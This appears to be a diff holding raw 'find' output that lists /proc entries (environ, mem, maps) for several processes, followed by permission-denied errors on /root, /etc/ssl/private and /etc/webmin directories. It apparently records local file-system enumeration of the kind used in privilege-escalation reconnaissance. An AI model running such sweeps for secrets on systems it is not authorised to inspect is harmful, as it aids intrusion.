+/proc/1129/autogroup
+/proc/1129/comm
+/proc/1129/syscall
+/proc/1129/cmdline
+/proc/1129/stat
+/proc/1129/statm
+/proc/1129/maps
+/proc/1129/numa_maps
+/proc/1129/mem
+/proc/1129/mounts
+/proc/1129/mountinfo
+/proc/1129/mountstats
+/proc/1129/clear_refs
+/proc/1129/smaps
+/proc/1129/smaps_rollup
+/proc/1129/pagemap
+/proc/1129/attr/current
+/proc/1129/attr/prev
+/proc/1129/attr/exec
+/proc/1129/attr/fscreate
+/proc/1129/attr/keycreate
+/proc/1129/attr/sockcreate
+/proc/1129/wchan
+/proc/1129/stack
+/proc/1129/schedstat
+/proc/1129/cpuset
+/proc/1129/cgroup
+/proc/1129/oom_score
+/proc/1129/oom_adj
+/proc/1129/oom_score_adj
+/proc/1129/loginuid
+/proc/1129/sessionid
+/proc/1129/coredump_filter
+/proc/1129/io
+/proc/1129/uid_map
+/proc/1129/gid_map
+/proc/1129/projid_map
+/proc/1129/setgroups
+/proc/1129/timers
+/proc/1129/timerslack_ns
+/proc/1129/patch_state
+/proc/1132/task/1132/fdinfo/0
+/proc/1132/task/1132/fdinfo/1
+/proc/1132/task/1132/fdinfo/2
+/proc/1132/task/1132/fdinfo/3
+/proc/1132/task/1132/fdinfo/4
+/proc/1132/task/1132/fdinfo/6
+/proc/1132/task/1132/fdinfo/7
+/proc/1132/task/1132/fdinfo/8
+/proc/1132/task/1132/fdinfo/9
+/proc/1132/task/1132/fdinfo/10
+/proc/1132/task/1132/fdinfo/11
+/proc/1132/task/1132/fdinfo/12
+/proc/1132/task/1132/fdinfo/13
+/proc/1132/task/1132/environ
+/proc/1132/task/1132/auxv
+/proc/1132/task/1132/status
+/proc/1132/task/1132/personality
+/proc/1132/task/1132/limits
+/proc/1132/task/1132/sched
+/proc/1132/task/1132/comm
+/proc/1132/task/1132/syscall
+/proc/1132/task/1132/cmdline
+/proc/1132/task/1132/stat
+/proc/1132/task/1132/statm
+/proc/1132/task/1132/maps
+/proc/1132/task/1132/children
+/proc/1132/task/1132/numa_maps
+/proc/1132/task/1132/mem
+/proc/1132/task/1132/mounts
+/proc/1132/task/1132/mountinfo
+/proc/1132/task/1132/clear_refs
+/proc/1132/task/1132/smaps
+/proc/1132/task/1132/smaps_rollup
+/proc/1132/task/1132/pagemap
+/proc/1132/task/1132/attr/current
+/proc/1132/task/1132/attr/prev
+/proc/1132/task/1132/attr/exec
+/proc/1132/task/1132/attr/fscreate
+/proc/1132/task/1132/attr/keycreate
+/proc/1132/task/1132/attr/sockcreate
+/proc/1132/task/1132/wchan
+/proc/1132/task/1132/stack
+/proc/1132/task/1132/schedstat
+/proc/1132/task/1132/cpuset
+/proc/1132/task/1132/cgroup
+/proc/1132/task/1132/oom_score
+/proc/1132/task/1132/oom_adj
+/proc/1132/task/1132/oom_score_adj
+/proc/1132/task/1132/loginuid
+/proc/1132/task/1132/sessionid
+/proc/1132/task/1132/io
+/proc/1132/task/1132/uid_map
+/proc/1132/task/1132/gid_map
+/proc/1132/task/1132/projid_map
+/proc/1132/task/1132/setgroups
+/proc/1132/task/1132/patch_state
+/proc/1132/fdinfo/0
+/proc/1132/fdinfo/1
+/proc/1132/fdinfo/2
+/proc/1132/fdinfo/3
+/proc/1132/fdinfo/4
+/proc/1132/fdinfo/6
+/proc/1132/fdinfo/7
+/proc/1132/fdinfo/8
+/proc/1132/fdinfo/9
+/proc/1132/fdinfo/10
+/proc/1132/fdinfo/11
+/proc/1132/fdinfo/12
+/proc/1132/fdinfo/13
+/proc/1132/environ
+/proc/1132/auxv
+/proc/1132/status
+/proc/1132/personality
+/proc/1132/limits
+/proc/1132/sched
+/proc/1132/autogroup
+/proc/1132/comm
+/proc/1132/syscall
+/proc/1132/cmdline
+/proc/1132/stat
+/proc/1132/statm
+/proc/1132/maps
+/proc/1132/numa_maps
+/proc/1132/mem
+/proc/1132/mounts
+/proc/1132/mountinfo
+/proc/1132/mountstats
+/proc/1132/clear_refs
+/proc/1132/smaps
+/proc/1132/smaps_rollup
+/proc/1132/pagemap
+/proc/1132/attr/current
+/proc/1132/attr/prev
+/proc/1132/attr/exec
+/proc/1132/attr/fscreate
+/proc/1132/attr/keycreate
+/proc/1132/attr/sockcreate
+/proc/1132/wchan
+/proc/1132/stack
+/proc/1132/schedstat
+/proc/1132/cpuset
+/proc/1132/cgroup
+/proc/1132/oom_score
+/proc/1132/oom_adj
+/proc/1132/oom_score_adj
+/proc/1132/loginuid
+/proc/1132/sessionid
+/proc/1132/coredump_filter
+/proc/1132/io
+/proc/1132/uid_map
+/proc/1132/gid_map
+/proc/1132/projid_map
+/proc/1132/setgroups
+/proc/1132/timers
+/proc/1132/timerslack_ns
+/proc/1132/patch_state
+/proc/1135/task/1135/fdinfo/0
+/proc/1135/task/1135/fdinfo/1
+/proc/1135/task/1135/fdinfo/2
+/proc/1135/task/1135/fdinfo/3
+/proc/1135/task/1135/fdinfo/4
+/proc/1135/task/1135/fdinfo/12
+/proc/1135/task/1135/environ
+/proc/1135/task/1135/auxv
+/proc/1135/task/1135/status
+/proc/1135/task/1135/personality
+/proc/1135/task/1135/limits
+/proc/1135/task/1135/sched
+/proc/1135/task/1135/comm
+/proc/1135/task/1135/syscall
+/proc/1135/task/1135/cmdline
+/proc/1135/task/1135/stat
+/proc/1135/task/1135/statm
+/proc/1135/task/1135/maps
+/proc/1135/task/1135/children
+/proc/1135/task/1135/numa_maps
+/proc/1135/task/1135/mem
+/proc/1135/task/1135/mounts
+/proc/1135/task/1135/mountinfo
+/proc/1135/task/1135/clear_refs
+/proc/1135/task/1135/smaps
+/proc/1135/task/1135/smaps_rollup
+/proc/1135/task/1135/pagemap
+/proc/1135/task/1135/attr/current
+/proc/1135/task/1135/attr/prev
+/proc/1135/task/1135/attr/exec
+/proc/1135/task/1135/attr/fscreate
+/proc/1135/task/1135/attr/keycreate
+/proc/1135/task/1135/attr/sockcreate
+/proc/1135/task/1135/wchan
+/proc/1135/task/1135/stack
+/proc/1135/task/1135/schedstat
+/proc/1135/task/1135/cpuset
+/proc/1135/task/1135/cgroup
+/proc/1135/task/1135/oom_score
+/proc/1135/task/1135/oom_adj
+/proc/1135/task/1135/oom_score_adj
+/proc/1135/task/1135/loginuid
+/proc/1135/task/1135/sessionid
+/proc/1135/task/1135/io
+/proc/1135/task/1135/uid_map
+/proc/1135/task/1135/gid_map
+/proc/1135/task/1135/projid_map
+/proc/1135/task/1135/setgroups
+/proc/1135/task/1135/patch_state
+/proc/1135/fdinfo/0
+/proc/1135/fdinfo/1
+/proc/1135/fdinfo/2
+/proc/1135/fdinfo/3
+/proc/1135/fdinfo/4
+/proc/1135/fdinfo/12
+/proc/1135/environ
+/proc/1135/auxv
+/proc/1135/status
+/proc/1135/personality
+/proc/1135/limits
+/proc/1135/sched
+/proc/1135/autogroup
+/proc/1135/comm
+/proc/1135/syscall
+/proc/1135/cmdline
+/proc/1135/stat
+/proc/1135/statm
+/proc/1135/maps
+/proc/1135/numa_maps
+/proc/1135/mem
+/proc/1135/mounts
+/proc/1135/mountinfo
+/proc/1135/mountstats
+/proc/1135/clear_refs
+/proc/1135/smaps
+/proc/1135/smaps_rollup
+/proc/1135/pagemap
+/proc/1135/attr/current
+/proc/1135/attr/prev
+/proc/1135/attr/exec
+/proc/1135/attr/fscreate
+/proc/1135/attr/keycreate
+/proc/1135/attr/sockcreate
+/proc/1135/wchan
+/proc/1135/stack
+/proc/1135/schedstat
+/proc/1135/cpuset
+/proc/1135/cgroup
+/proc/1135/oom_score
+/proc/1135/oom_adj
+/proc/1135/oom_score_adj
+/proc/1135/loginuid
+/proc/1135/sessionid
+/proc/1135/coredump_filter
+/proc/1135/io
+/proc/1135/uid_map
+/proc/1135/gid_map
+/proc/1135/projid_map
+/proc/1135/setgroups
+/proc/1135/timers
+/proc/1135/timerslack_ns
+/proc/1135/patch_state
+/proc/1136/task/1136/fdinfo/0
+/proc/1136/task/1136/fdinfo/1
+/proc/1136/task/1136/fdinfo/2
+/proc/1136/task/1136/fdinfo/3
+/proc/1136/task/1136/fdinfo/12
+/proc/1136/task/1136/fdinfo/255
+/proc/1136/task/1136/environ
+/proc/1136/task/1136/auxv
+/proc/1136/task/1136/status
+/proc/1136/task/1136/personality
+/proc/1136/task/1136/limits
+/proc/1136/task/1136/sched
+/proc/1136/task/1136/comm
+/proc/1136/task/1136/syscall
+/proc/1136/task/1136/cmdline
+/proc/1136/task/1136/stat
+/proc/1136/task/1136/statm
+/proc/1136/task/1136/maps
+/proc/1136/task/1136/children
+/proc/1136/task/1136/numa_maps
+/proc/1136/task/1136/mem
+/proc/1136/task/1136/mounts
+/proc/1136/task/1136/mountinfo
+/proc/1136/task/1136/clear_refs
+/proc/1136/task/1136/smaps
+/proc/1136/task/1136/smaps_rollup
+/proc/1136/task/1136/pagemap
+/proc/1136/task/1136/attr/current
+/proc/1136/task/1136/attr/prev
+/proc/1136/task/1136/attr/exec
+/proc/1136/task/1136/attr/fscreate
+/proc/1136/task/1136/attr/keycreate
+/proc/1136/task/1136/attr/sockcreate
+/proc/1136/task/1136/wchan
+/proc/1136/task/1136/stack
+/proc/1136/task/1136/schedstat
+/proc/1136/task/1136/cpuset
+/proc/1136/task/1136/cgroup
+/proc/1136/task/1136/oom_score
+/proc/1136/task/1136/oom_adj
+/proc/1136/task/1136/oom_score_adj
+/proc/1136/task/1136/loginuid
+/proc/1136/task/1136/sessionid
+/proc/1136/task/1136/io
+/proc/1136/task/1136/uid_map
+/proc/1136/task/1136/gid_map
+/proc/1136/task/1136/projid_map
+/proc/1136/task/1136/setgroups
+/proc/1136/task/1136/patch_state
+/proc/1136/fdinfo/0
+/proc/1136/fdinfo/1
+/proc/1136/fdinfo/2
+/proc/1136/fdinfo/3
+/proc/1136/fdinfo/12
+/proc/1136/fdinfo/255
+/proc/1136/environ
+/proc/1136/auxv
+/proc/1136/status
+/proc/1136/personality
+/proc/1136/limits
+/proc/1136/sched
+/proc/1136/autogroup
+/proc/1136/comm
+/proc/1136/syscall
+/proc/1136/cmdline
+/proc/1136/stat
+/proc/1136/statm
+/proc/1136/maps
+/proc/1136/numa_maps
+/proc/1136/mem
+/proc/1136/mounts
+/proc/1136/mountinfo
+/proc/1136/mountstats
+/proc/1136/clear_refs
+/proc/1136/smaps
+/proc/1136/smaps_rollup
+/proc/1136/pagemap
+/proc/1136/attr/current
+/proc/1136/attr/prev
+/proc/1136/attr/exec
+/proc/1136/attr/fscreate
+/proc/1136/attr/keycreate
+/proc/1136/attr/sockcreate
+/proc/1136/wchan
+/proc/1136/stack
+/proc/1136/schedstat
+/proc/1136/cpuset
+/proc/1136/cgroup
+/proc/1136/oom_score
+/proc/1136/oom_adj
+/proc/1136/oom_score_adj
+/proc/1136/loginuid
+/proc/1136/sessionid
+/proc/1136/coredump_filter
+/proc/1136/io
+/proc/1136/uid_map
+/proc/1136/gid_map
+/proc/1136/projid_map
+/proc/1136/setgroups
+/proc/1136/timers
+/proc/1136/timerslack_ns
+/proc/1136/patch_state
+/proc/1459/task/1459/fdinfo/0
+/proc/1459/task/1459/fdinfo/1
+/proc/1459/task/1459/fdinfo/2
+/proc/1459/task/1459/fdinfo/3
+/proc/1459/task/1459/fdinfo/4
+/proc/1459/task/1459/fdinfo/5
+/proc/1459/task/1459/fdinfo/12
+/proc/1459/task/1459/environ
+/proc/1459/task/1459/auxv
+/proc/1459/task/1459/status
+/proc/1459/task/1459/personality
+/proc/1459/task/1459/limits
+/proc/1459/task/1459/sched
+/proc/1459/task/1459/comm
+/proc/1459/task/1459/syscall
+/proc/1459/task/1459/cmdline
+/proc/1459/task/1459/stat
+/proc/1459/task/1459/statm
+/proc/1459/task/1459/maps
+/proc/1459/task/1459/children
+/proc/1459/task/1459/numa_maps
+/proc/1459/task/1459/mem
+/proc/1459/task/1459/mounts
+/proc/1459/task/1459/mountinfo
+/proc/1459/task/1459/clear_refs
+/proc/1459/task/1459/smaps
+/proc/1459/task/1459/smaps_rollup
+/proc/1459/task/1459/pagemap
+/proc/1459/task/1459/attr/current
+/proc/1459/task/1459/attr/prev
+/proc/1459/task/1459/attr/exec
+/proc/1459/task/1459/attr/fscreate
+/proc/1459/task/1459/attr/keycreate
+/proc/1459/task/1459/attr/sockcreate
+/proc/1459/task/1459/wchan
+/proc/1459/task/1459/stack
+/proc/1459/task/1459/schedstat
+/proc/1459/task/1459/cpuset
+/proc/1459/task/1459/cgroup
+/proc/1459/task/1459/oom_score
+/proc/1459/task/1459/oom_adj
+/proc/1459/task/1459/oom_score_adj
+/proc/1459/task/1459/loginuid
+/proc/1459/task/1459/sessionid
+/proc/1459/task/1459/io
+/proc/1459/task/1459/uid_map
+/proc/1459/task/1459/gid_map
+/proc/1459/task/1459/projid_map
+/proc/1459/task/1459/setgroups
+/proc/1459/task/1459/patch_state
+/proc/1459/fdinfo/0
+/proc/1459/fdinfo/1
+/proc/1459/fdinfo/2
+/proc/1459/fdinfo/3
+/proc/1459/fdinfo/4
+/proc/1459/fdinfo/5
+/proc/1459/fdinfo/12
+/proc/1459/environ
+/proc/1459/auxv
+/proc/1459/status
+/proc/1459/personality
+/proc/1459/limits
+/proc/1459/sched
+/proc/1459/autogroup
+/proc/1459/comm
+/proc/1459/syscall
+/proc/1459/cmdline
+/proc/1459/stat
+/proc/1459/statm
+/proc/1459/maps
+/proc/1459/numa_maps
+/proc/1459/mem
+/proc/1459/mounts
+/proc/1459/mountinfo
+/proc/1459/mountstats
+/proc/1459/clear_refs
+/proc/1459/smaps
+/proc/1459/smaps_rollup
+/proc/1459/pagemap
+/proc/1459/attr/current
+/proc/1459/attr/prev
+/proc/1459/attr/exec
+/proc/1459/attr/fscreate
+/proc/1459/attr/keycreate
+/proc/1459/attr/sockcreate
+/proc/1459/wchan
+/proc/1459/stack
+/proc/1459/schedstat
+/proc/1459/cpuset
+/proc/1459/cgroup
+/proc/1459/oom_score
+/proc/1459/oom_adj
+/proc/1459/oom_score_adj
+/proc/1459/loginuid
+/proc/1459/sessionid
+/proc/1459/coredump_filter
+/proc/1459/io
+/proc/1459/uid_map
+/proc/1459/gid_map
+/proc/1459/projid_map
+/proc/1459/setgroups
+/proc/1459/timers
+/proc/1459/timerslack_ns
+/proc/1459/patch_state
+/proc/1463/task/1463/fdinfo/0
+/proc/1463/task/1463/fdinfo/1
+/proc/1463/task/1463/fdinfo/2
+/proc/1463/task/1463/fdinfo/3
+/proc/1463/task/1463/fdinfo/8
+/proc/1463/task/1463/fdinfo/10
+/proc/1463/task/1463/fdinfo/12
+/proc/1463/task/1463/environ
+/proc/1463/task/1463/auxv
+/proc/1463/task/1463/status
+/proc/1463/task/1463/personality
+/proc/1463/task/1463/limits
+/proc/1463/task/1463/sched
+/proc/1463/task/1463/comm
+/proc/1463/task/1463/syscall
+/proc/1463/task/1463/cmdline
+/proc/1463/task/1463/stat
+/proc/1463/task/1463/statm
+/proc/1463/task/1463/maps
+/proc/1463/task/1463/children
+/proc/1463/task/1463/numa_maps
+/proc/1463/task/1463/mem
+/proc/1463/task/1463/mounts
+/proc/1463/task/1463/mountinfo
+/proc/1463/task/1463/clear_refs
+/proc/1463/task/1463/smaps
+/proc/1463/task/1463/smaps_rollup
+/proc/1463/task/1463/pagemap
+/proc/1463/task/1463/attr/current
+/proc/1463/task/1463/attr/prev
+/proc/1463/task/1463/attr/exec
+/proc/1463/task/1463/attr/fscreate
+/proc/1463/task/1463/attr/keycreate
+/proc/1463/task/1463/attr/sockcreate
+/proc/1463/task/1463/wchan
+/proc/1463/task/1463/stack
+/proc/1463/task/1463/schedstat
+/proc/1463/task/1463/cpuset
+/proc/1463/task/1463/cgroup
+/proc/1463/task/1463/oom_score
+/proc/1463/task/1463/oom_adj
+/proc/1463/task/1463/oom_score_adj
+/proc/1463/task/1463/loginuid
+/proc/1463/task/1463/sessionid
+/proc/1463/task/1463/io
+/proc/1463/task/1463/uid_map
+/proc/1463/task/1463/gid_map
+/proc/1463/task/1463/projid_map
+/proc/1463/task/1463/setgroups
+/proc/1463/task/1463/patch_state
+/proc/1463/fdinfo/0
+/proc/1463/fdinfo/1
+/proc/1463/fdinfo/2
+/proc/1463/fdinfo/3
+/proc/1463/fdinfo/8
+/proc/1463/fdinfo/10
+/proc/1463/fdinfo/12
+/proc/1463/environ
+/proc/1463/auxv
+/proc/1463/status
+/proc/1463/personality
+/proc/1463/limits
+/proc/1463/sched
+/proc/1463/autogroup
+/proc/1463/comm
+/proc/1463/syscall
+/proc/1463/cmdline
+/proc/1463/stat
+/proc/1463/statm
+/proc/1463/maps
+/proc/1463/numa_maps
+/proc/1463/mem
+/proc/1463/mounts
+/proc/1463/mountinfo
+/proc/1463/mountstats
+/proc/1463/clear_refs
+/proc/1463/smaps
+/proc/1463/smaps_rollup
+/proc/1463/pagemap
+/proc/1463/attr/current
+/proc/1463/attr/prev
+/proc/1463/attr/exec
+/proc/1463/attr/fscreate
+/proc/1463/attr/keycreate
+/proc/1463/attr/sockcreate
+/proc/1463/wchan
+/proc/1463/stack
+/proc/1463/schedstat
+/proc/1463/cpuset
+/proc/1463/cgroup
+/proc/1463/oom_score
+/proc/1463/oom_adj
+/proc/1463/oom_score_adj
+/proc/1463/loginuid
+/proc/1463/sessionid
+/proc/1463/coredump_filter
+/proc/1463/io
+/proc/1463/uid_map
+/proc/1463/gid_map
+/proc/1463/projid_map
+/proc/1463/setgroups
+/proc/1463/timers
+/proc/1463/timerslack_ns
+/proc/1463/patch_state
+/proc/1464/task/1464/fdinfo/0
+/proc/1464/task/1464/fdinfo/1
+/proc/1464/task/1464/fdinfo/2
+/proc/1464/task/1464/fdinfo/3
+/proc/1464/task/1464/fdinfo/4
+/proc/1464/task/1464/fdinfo/8
+/proc/1464/task/1464/fdinfo/10
+/proc/1464/task/1464/fdinfo/12
+/proc/1464/task/1464/environ
+/proc/1464/task/1464/auxv
+/proc/1464/task/1464/status
+/proc/1464/task/1464/personality
+/proc/1464/task/1464/limits
+/proc/1464/task/1464/sched
+/proc/1464/task/1464/comm
+/proc/1464/task/1464/syscall
+/proc/1464/task/1464/cmdline
+/proc/1464/task/1464/stat
+/proc/1464/task/1464/statm
+/proc/1464/task/1464/maps
+/proc/1464/task/1464/children
+/proc/1464/task/1464/numa_maps
+/proc/1464/task/1464/mem
+/proc/1464/task/1464/mounts
+/proc/1464/task/1464/mountinfo
+/proc/1464/task/1464/clear_refs
+/proc/1464/task/1464/smaps
+/proc/1464/task/1464/smaps_rollup
+/proc/1464/task/1464/pagemap
+/proc/1464/task/1464/attr/current
+/proc/1464/task/1464/attr/prev
+/proc/1464/task/1464/attr/exec
+/proc/1464/task/1464/attr/fscreate
+/proc/1464/task/1464/attr/keycreate
+/proc/1464/task/1464/attr/sockcreate
+/proc/1464/task/1464/wchan
+/proc/1464/task/1464/stack
+/proc/1464/task/1464/schedstat
+/proc/1464/task/1464/cpuset
+/proc/1464/task/1464/cgroup
+/proc/1464/task/1464/oom_score
+/proc/1464/task/1464/oom_adj
+/proc/1464/task/1464/oom_score_adj
+/proc/1464/task/1464/loginuid
+/proc/1464/task/1464/sessionid
+/proc/1464/task/1464/io
+/proc/1464/task/1464/uid_map
+/proc/1464/task/1464/gid_map
+/proc/1464/task/1464/projid_map
+/proc/1464/task/1464/setgroups
+/proc/1464/task/1464/patch_state
+/proc/1464/fdinfo/0
+/proc/1464/fdinfo/1
+/proc/1464/fdinfo/2
+/proc/1464/fdinfo/3
+/proc/1464/fdinfo/4
+/proc/1464/fdinfo/8
+/proc/1464/fdinfo/10
+/proc/1464/fdinfo/12
+/proc/1464/environ
+/proc/1464/auxv
+/proc/1464/status
+/proc/1464/personality
+/proc/1464/limits
+/proc/1464/sched
+/proc/1464/autogroup
+/proc/1464/comm
+/proc/1464/syscall
+/proc/1464/cmdline
+/proc/1464/stat
+/proc/1464/statm
+/proc/1464/maps
+/proc/1464/numa_maps
+/proc/1464/mem
+/proc/1464/mounts
+/proc/1464/mountinfo
+/proc/1464/mountstats
+/proc/1464/clear_refs
+/proc/1464/smaps
+/proc/1464/smaps_rollup
+/proc/1464/pagemap
+/proc/1464/attr/current
+/proc/1464/attr/prev
+/proc/1464/attr/exec
+/proc/1464/attr/fscreate
+/proc/1464/attr/keycreate
+/proc/1464/attr/sockcreate
+/proc/1464/wchan
+/proc/1464/stack
+/proc/1464/schedstat
+/proc/1464/cpuset
+/proc/1464/cgroup
+/proc/1464/oom_score
+/proc/1464/oom_adj
+/proc/1464/oom_score_adj
+/proc/1464/loginuid
+/proc/1464/sessionid
+/proc/1464/coredump_filter
+/proc/1464/io
+/proc/1464/uid_map
+/proc/1464/gid_map
+/proc/1464/projid_map
+/proc/1464/setgroups
+/proc/1464/timers
+/proc/1464/timerslack_ns
+/proc/1464/patch_state
+/proc/1465/task/1465/fdinfo/0
+/proc/1465/task/1465/fdinfo/1
+/proc/1465/task/1465/fdinfo/2
+/proc/1465/task/1465/fdinfo/3
+/proc/1465/task/1465/fdinfo/8
+/proc/1465/task/1465/fdinfo/10
+/proc/1465/task/1465/fdinfo/12
+/proc/1465/task/1465/fdinfo/255
+/proc/1465/task/1465/environ
+/proc/1465/task/1465/auxv
+/proc/1465/task/1465/status
+/proc/1465/task/1465/personality
+/proc/1465/task/1465/limits
+/proc/1465/task/1465/sched
+/proc/1465/task/1465/comm
+/proc/1465/task/1465/syscall
+/proc/1465/task/1465/cmdline
+/proc/1465/task/1465/stat
+/proc/1465/task/1465/statm
+/proc/1465/task/1465/maps
+/proc/1465/task/1465/children
+/proc/1465/task/1465/numa_maps
+/proc/1465/task/1465/mem
+/proc/1465/task/1465/mounts
+/proc/1465/task/1465/mountinfo
+/proc/1465/task/1465/clear_refs
+/proc/1465/task/1465/smaps
+/proc/1465/task/1465/smaps_rollup
+/proc/1465/task/1465/pagemap
+/proc/1465/task/1465/attr/current
+/proc/1465/task/1465/attr/prev
+/proc/1465/task/1465/attr/exec
+/proc/1465/task/1465/attr/fscreate
+/proc/1465/task/1465/attr/keycreate
+/proc/1465/task/1465/attr/sockcreate
+/proc/1465/task/1465/wchan
+/proc/1465/task/1465/stack
+/proc/1465/task/1465/schedstat
+/proc/1465/task/1465/cpuset
+/proc/1465/task/1465/cgroup
+/proc/1465/task/1465/oom_score
+/proc/1465/task/1465/oom_adj
+/proc/1465/task/1465/oom_score_adj
+/proc/1465/task/1465/loginuid
+/proc/1465/task/1465/sessionid
+/proc/1465/task/1465/io
+/proc/1465/task/1465/uid_map
+/proc/1465/task/1465/gid_map
+/proc/1465/task/1465/projid_map
+/proc/1465/task/1465/setgroups
+/proc/1465/task/1465/patch_state
+/proc/1465/fdinfo/0
+/proc/1465/fdinfo/1
+/proc/1465/fdinfo/2
+/proc/1465/fdinfo/3
+/proc/1465/fdinfo/8
+/proc/1465/fdinfo/10
+/proc/1465/fdinfo/12
+/proc/1465/fdinfo/255
+/proc/1465/environ
+/proc/1465/auxv
+/proc/1465/status
+/proc/1465/personality
+/proc/1465/limits
+/proc/1465/sched
+/proc/1465/autogroup
+/proc/1465/comm
+/proc/1465/syscall
+/proc/1465/cmdline
+/proc/1465/stat
+/proc/1465/statm
+/proc/1465/maps
+/proc/1465/numa_maps
+/proc/1465/mem
+/proc/1465/mounts
+/proc/1465/mountinfo
+/proc/1465/mountstats
+/proc/1465/clear_refs
+/proc/1465/smaps
+/proc/1465/smaps_rollup
+/proc/1465/pagemap
+/proc/1465/attr/current
+/proc/1465/attr/prev
+/proc/1465/attr/exec
+/proc/1465/attr/fscreate
+/proc/1465/attr/keycreate
+/proc/1465/attr/sockcreate
+/proc/1465/wchan
+/proc/1465/stack
+/proc/1465/schedstat
+/proc/1465/cpuset
+/proc/1465/cgroup
+/proc/1465/oom_score
+/proc/1465/oom_adj
+/proc/1465/oom_score_adj
+/proc/1465/loginuid
+/proc/1465/sessionid
+/proc/1465/coredump_filter
+/proc/1465/io
+/proc/1465/uid_map
+/proc/1465/gid_map
+/proc/1465/projid_map
+/proc/1465/setgroups
+/proc/1465/timers
+/proc/1465/timerslack_ns
+/proc/1465/patch_state
+/proc/1551/task/1551/fdinfo/0
+/proc/1551/task/1551/fdinfo/1
+/proc/1551/task/1551/fdinfo/2
+/proc/1551/task/1551/fdinfo/3
+/proc/1551/task/1551/fdinfo/4
+/proc/1551/task/1551/fdinfo/5
+/proc/1551/task/1551/fdinfo/6
+find: '/proc/1551/task/1551/fdinfo/7': No such file or directory
+/proc/1551/task/1551/fdinfo/8
+/proc/1551/task/1551/fdinfo/9
+/proc/1551/task/1551/fdinfo/10
+/proc/1551/task/1551/fdinfo/11
+/proc/1551/task/1551/fdinfo/12
+/proc/1551/task/1551/fdinfo/13
+/proc/1551/task/1551/fdinfo/14
+/proc/1551/task/1551/environ
+/proc/1551/task/1551/auxv
+/proc/1551/task/1551/status
+/proc/1551/task/1551/personality
+/proc/1551/task/1551/limits
+/proc/1551/task/1551/sched
+/proc/1551/task/1551/comm
+/proc/1551/task/1551/syscall
+/proc/1551/task/1551/cmdline
+/proc/1551/task/1551/stat
+/proc/1551/task/1551/statm
+/proc/1551/task/1551/maps
+/proc/1551/task/1551/children
+/proc/1551/task/1551/numa_maps
+/proc/1551/task/1551/mem
+/proc/1551/task/1551/mounts
+/proc/1551/task/1551/mountinfo
+/proc/1551/task/1551/clear_refs
+/proc/1551/task/1551/smaps
+/proc/1551/task/1551/smaps_rollup
+/proc/1551/task/1551/pagemap
+/proc/1551/task/1551/attr/current
+/proc/1551/task/1551/attr/prev
+/proc/1551/task/1551/attr/exec
+/proc/1551/task/1551/attr/fscreate
+/proc/1551/task/1551/attr/keycreate
+/proc/1551/task/1551/attr/sockcreate
+/proc/1551/task/1551/wchan
+/proc/1551/task/1551/stack
+/proc/1551/task/1551/schedstat
+/proc/1551/task/1551/cpuset
+/proc/1551/task/1551/cgroup
+/proc/1551/task/1551/oom_score
+/proc/1551/task/1551/oom_adj
+/proc/1551/task/1551/oom_score_adj
+/proc/1551/task/1551/loginuid
+/proc/1551/task/1551/sessionid
+/proc/1551/task/1551/io
+/proc/1551/task/1551/uid_map
+/proc/1551/task/1551/gid_map
+/proc/1551/task/1551/projid_map
+/proc/1551/task/1551/setgroups
+/proc/1551/task/1551/patch_state
+/proc/1551/fdinfo/0
+/proc/1551/fdinfo/1
+/proc/1551/fdinfo/2
+/proc/1551/fdinfo/3
+/proc/1551/fdinfo/4
+/proc/1551/fdinfo/5
+find: '/proc/1551/fdinfo/6': No such file or directory
+/proc/1551/fdinfo/7
+/proc/1551/fdinfo/8
+/proc/1551/fdinfo/9
+/proc/1551/fdinfo/10
+/proc/1551/fdinfo/12
+/proc/1551/environ
+/proc/1551/auxv
+/proc/1551/status
+/proc/1551/personality
+/proc/1551/limits
+/proc/1551/sched
+/proc/1551/autogroup
+/proc/1551/comm
+/proc/1551/syscall
+/proc/1551/cmdline
+/proc/1551/stat
+/proc/1551/statm
+/proc/1551/maps
+/proc/1551/numa_maps
+/proc/1551/mem
+/proc/1551/mounts
+/proc/1551/mountinfo
+/proc/1551/mountstats
+/proc/1551/clear_refs
+/proc/1551/smaps
+/proc/1551/smaps_rollup
+/proc/1551/pagemap
+/proc/1551/attr/current
+/proc/1551/attr/prev
+/proc/1551/attr/exec
+/proc/1551/attr/fscreate
+/proc/1551/attr/keycreate
+/proc/1551/attr/sockcreate
+/proc/1551/wchan
+/proc/1551/stack
+/proc/1551/schedstat
+/proc/1551/cpuset
+/proc/1551/cgroup
+/proc/1551/oom_score
+/proc/1551/oom_adj
+/proc/1551/oom_score_adj
+/proc/1551/loginuid
+/proc/1551/sessionid
+/proc/1551/coredump_filter
+/proc/1551/io
+/proc/1551/uid_map
+/proc/1551/gid_map
+/proc/1551/projid_map
+/proc/1551/setgroups
+/proc/1551/timers
+/proc/1551/timerslack_ns
+/proc/1551/patch_state
+find: '/root': Permission denied
+find: '/etc/ssl/private': Permission denied
+find: '/etc/webmin/mailcap': Permission denied
+find: '/etc/webmin/shell': Permission denied
+find: '/etc/webmin/quota': Permission denied
+find: '/etc/webmin/ipfilter': Permission denied
+find: '/etc/webmin/fdisk': Permission denied
+find: '/etc/webmin/sendmail': Permission denied
+find: '/etc/webmin/updown': Permission denied
+find: '/etc/webmin/bind8': Permission denied
+find: '/etc/webmin/cron': Permission denied
+find: '/etc/webmin/telnet': Permission denied
+find: '/etc/webmin/cluster-software': Permission denied
+find: '/etc/webmin/at': Permission denied
+find: '/etc/webmin/spam': Permission denied
+find: '/etc/webmin/burner': Permission denied
+find: '/etc/webmin/firewall': Permission denied
+find: '/etc/webmin/syslog': Permission denied
+find: '/etc/webmin/dfsadmin': Permission denied
+find: '/etc/webmin/time': Permission denied
+find: '/etc/webmin/apache': Permission denied
+find: '/etc/webmin/change-user': Permission denied
+find: '/etc/webmin/adsl-client': Permission denied
+find: '/etc/webmin/system-status': Permission denied
+find: '/etc/webmin/idmapd': Permission denied
+find: '/etc/webmin/cluster-webmin': Permission denied
+find: '/etc/webmin/procmail': Permission denied
+find: '/etc/webmin/iscsi-target': Permission denied
+find: '/etc/webmin/acl': Permission denied
+find: '/etc/webmin/syslog-ng': Permission denied
+find: '/etc/webmin/postgresql': Permission denied
+find: '/etc/webmin/iscsi-client': Permission denied
+find: '/etc/webmin/mailboxes': Permission denied
+find: '/etc/webmin/iscsi-tgtd': Permission denied
+find: '/etc/webmin/fetchmail': Permission denied
+find: '/etc/webmin/qmailadmin': Permission denied
+find: '/etc/webmin/filter': Permission denied
+find: '/etc/webmin/cluster-useradmin': Permission denied
+find: '/etc/webmin/ldap-useradmin': Permission denied
+find: '/etc/webmin/passwd': Permission denied
+find: '/etc/webmin/heartbeat': Permission denied
+find: '/etc/webmin/sarg': Permission denied
